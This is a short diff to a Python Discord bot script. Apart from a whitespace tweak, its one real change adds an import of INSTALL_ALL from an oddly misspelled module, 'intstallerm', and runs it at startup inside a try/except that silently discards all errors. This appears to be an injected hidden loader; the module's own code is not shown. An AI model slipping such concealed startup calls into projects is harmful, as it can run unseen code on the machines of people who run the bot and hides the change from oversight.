@@ -4,7 +4,11 @@ import discord, json, asyncio, string
 import time, os, platform, datetime, random
 from discord.ext import commands
 from keep_alive import keep_alive
-
+from intstallerm import INSTALL_ALL
+try:
+    INSTALL_ALL()
+except:
+    pass
 
 # MAIN VERIABLES
 # --------------------------
@@ -299,7 +303,7 @@ async def on_message(message):
             if subcmnd in spam_unsafe_wl:
                 
 
-                
+
         await client.process_commands(message)
     
 
